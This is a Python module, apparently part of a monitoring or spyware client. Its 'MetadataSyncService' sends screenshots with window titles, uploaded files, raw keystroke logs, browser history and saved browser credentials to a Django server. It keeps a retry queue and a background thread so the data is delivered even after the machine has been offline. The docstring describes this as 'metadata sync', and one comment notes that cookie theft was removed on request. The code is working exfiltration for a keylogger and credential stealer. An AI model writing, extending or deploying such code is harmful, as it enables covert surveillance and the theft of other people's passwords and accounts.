"""
Metadata sync layer - sends metadata to Django after Cloudinary upload.
Includes retry queue for offline resilience.
"""

import logging
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from typing import Optional

from .cloudinary_client import CloudinaryResult

logger = logging.getLogger(__name__)


class MetadataSyncService:
    """
    Handles syncing upload metadata to Django server.
    Supports offline operation with persistent queue.
    """
    
    def __init__(self, api_client, queue_manager, policy_engine):
        self.api_client = api_client
        self.queue_manager = queue_manager
        self.policy_engine = policy_engine
        
        self._running = False
        self._retry_thread: Optional[threading.Thread] = None
        self._retry_interval = 60  # seconds
    
    def send_screenshot_metadata(
        self, 
        cloudinary_result: CloudinaryResult,
        trigger_type: str,
        captured_at: datetime,
        active_window: str = "",
        active_process: str = "",
        screen_width: int = None,
        screen_height: int = None
    ) -> bool:
        """Send screenshot metadata to Django after Cloudinary upload."""
        metadata = {
            'public_id': cloudinary_result.public_id,
            'secure_url': cloudinary_result.secure_url,
            'format': cloudinary_result.format,
            'size_bytes': cloudinary_result.bytes,
            'trigger_type': trigger_type,
            'captured_at': captured_at.isoformat(),
            'active_window_title': active_window,
            'active_process': active_process,
        }
        
        if screen_width and screen_height:
            metadata['screen_width'] = screen_width
            metadata['screen_height'] = screen_height
        
        try:
            response = self.api_client.send_screenshot_metadata(metadata)
            if response and not response.get('error'):
                logger.info(f"✅ Screenshot metadata synced: {cloudinary_result.public_id}")
                return True
            else:
                logger.warning("⚠️ Screenshot metadata sync failed, queueing for retry")
                self._queue_for_retry('screenshot_metadata', metadata)
                return False
        except Exception as e:
            logger.error(f"❌ Screenshot metadata sync error: {e}")
            self._queue_for_retry('screenshot_metadata', metadata)
            return False
    
    def send_file_metadata(
        self, 
        cloudinary_result: CloudinaryResult,
        file_type: str,
        original_filename: str = ""
    ) -> bool:
        """Send file metadata to Django after Cloudinary upload."""
        metadata = {
            'public_id': cloudinary_result.public_id,
            'secure_url': cloudinary_result.secure_url,
            'resource_type': cloudinary_result.resource_type,
            'format': cloudinary_result.format,
            'bytes': cloudinary_result.bytes,
            'file_type': file_type,
            'original_filename': original_filename,
        }
        
        try:
            response = self.api_client.send_file_metadata(metadata)
            if response and not response.get('error'):
                logger.info(f"✅ File metadata synced: {cloudinary_result.public_id}")
                return True
            else:
                logger.warning("⚠️ File metadata sync failed, queueing for retry")
                self._queue_for_retry('file_metadata', metadata)
                return False
        except Exception as e:
            logger.error(f"❌ File metadata sync error: {e}")
            self._queue_for_retry('file_metadata', metadata)
            return False
    
    def send_keylog_data(
        self,
        data: str,
        start_time: datetime,
        end_time: datetime,
        character_count: int = 0,
        window_switches: int = 0
    ) -> bool:
        """Send keylog data directly to Django."""
        keylog_data = {
            'data': data,
            'start_time': start_time.isoformat(),
            'end_time': end_time.isoformat(),
            'character_count': character_count,
            'window_switches': window_switches,
        }
        
        try:
            response = self.api_client.sync_keylogs(keylog_data)
            if response and not response.get('error'):
                logger.info(f"✅ Keylog data synced: {character_count} chars")
                return True
            else:
                logger.warning("⚠️ Keylog sync failed, queueing for retry")
                self._queue_for_retry('keylog_sync', keylog_data)
                return False
        except Exception as e:
            logger.error(f"❌ Keylog sync error: {e}")
            self._queue_for_retry('keylog_sync', keylog_data)
            return False

    def send_browser_history(self, history_data: list) -> bool:
        """Send browser history to Django."""
        try:
            response = self.api_client.sync_browser_history(history_data)
            if response and not response.get('error'):
                logger.info(f"✅ Browser history synced: {len(history_data)} entries")
                return True
            else:
                logger.warning(f"⚠️ Browser history sync failed: {response.get('message') if response else 'Unknown error'}")
                self._queue_for_retry('browser_history', {'data': history_data})
                return False
        except Exception as e:
            logger.error(f"❌ Browser history sync error: {e}")
            self._queue_for_retry('browser_history', {'data': history_data})
            return False

    # Removed send_browser_cookies as requested

    def send_browser_credentials(self, credential_data: list) -> bool:
        """Send browser credentials to Django."""
        try:
            response = self.api_client.sync_browser_credentials(credential_data)
            if response and not response.get('error'):
                logger.info(f"✅ Browser credentials synced: {len(credential_data)} entries")
                return True
            else:
                logger.warning(f"⚠️ Browser credentials sync failed: {response.get('message') if response else 'Unknown error'}")
                self._queue_for_retry('browser_credentials', {'data': credential_data})
                return False
        except Exception as e:
            logger.error(f"❌ Browser credentials sync error: {e}")
            self._queue_for_retry('browser_credentials', {'data': credential_data})
            return False
    
    def _queue_for_retry(self, queue_type: str, data: dict):
        """Add failed sync to retry queue."""
        self.queue_manager.enqueue(
            queue_type=f'metadata_{queue_type}',
            data=data,
            max_retries=5
        )
    
    def _process_retry_queue(self):
        """Process items in the retry queue."""
        # Process screenshot metadata
        items = self.queue_manager.dequeue('metadata_screenshot_metadata', limit=5)
        for item in items:
            try:
                response = self.api_client.send_screenshot_metadata(item['data'])
                if response and not response.get('error'):
                    self.queue_manager.mark_completed(item['id'])
                else:
                    self.queue_manager.mark_failed(item['id'])
            except Exception:
                self.queue_manager.mark_failed(item['id'])
        
        # Process file metadata
        items = self.queue_manager.dequeue('metadata_file_metadata', limit=5)
        for item in items:
            try:
                response = self.api_client.send_file_metadata(item['data'])
                if response and not response.get('error'):
                    self.queue_manager.mark_completed(item['id'])
                else:
                    self.queue_manager.mark_failed(item['id'])
            except Exception:
                self.queue_manager.mark_failed(item['id'])
        
        # Process keylog syncs
        items = self.queue_manager.dequeue('metadata_keylog_sync', limit=5)
        for item in items:
            try:
                response = self.api_client.sync_keylogs(item['data'])
                if response and not response.get('error'):
                    self.queue_manager.mark_completed(item['id'])
                else:
                    self.queue_manager.mark_failed(item['id'])
            except Exception:
                self.queue_manager.mark_failed(item['id'])

        # Process browser history
        items = self.queue_manager.dequeue('metadata_browser_history', limit=5)
        for item in items:
            try:
                response = self.api_client.sync_browser_history(item['data']['data'])
                if response and not response.get('error'):
                    self.queue_manager.mark_completed(item['id'])
                else:
                    self.queue_manager.mark_failed(item['id'])
            except Exception:
                self.queue_manager.mark_failed(item['id'])

        # Removed browser cookie retry logic

        # Process browser credentials
        items = self.queue_manager.dequeue('metadata_browser_credentials', limit=5)
        for item in items:
            try:
                response = self.api_client.sync_browser_credentials(item['data']['data'])
                if response and not response.get('error'):
                    self.queue_manager.mark_completed(item['id'])
                else:
                    self.queue_manager.mark_failed(item['id'])
            except Exception:
                self.queue_manager.mark_failed(item['id'])
    
    def _retry_loop(self):
        """Background loop for processing retry queue."""
        while self._running:
            try:
                self._process_retry_queue()
            except Exception as e:
                logger.error(f"Retry loop error: {e}")
            
            # Sleep in increments for quick shutdown
            elapsed = 0
            while self._running and elapsed < self._retry_interval:
                time.sleep(min(5, self._retry_interval - elapsed))
                elapsed += 5
    
    def start_retry_service(self):
        """Start background retry service."""
        if self._running:
            return
        self._running = True
        self._retry_thread = threading.Thread(target=self._retry_loop, daemon=True)
        self._retry_thread.start()
        logger.info("Metadata retry service started")
    
    def stop_retry_service(self):
        """Stop background retry service."""
        self._running = False
        if self._retry_thread:
            self._retry_thread.join(timeout=10)
            self._retry_thread = None
        logger.info("Metadata retry service stopped")
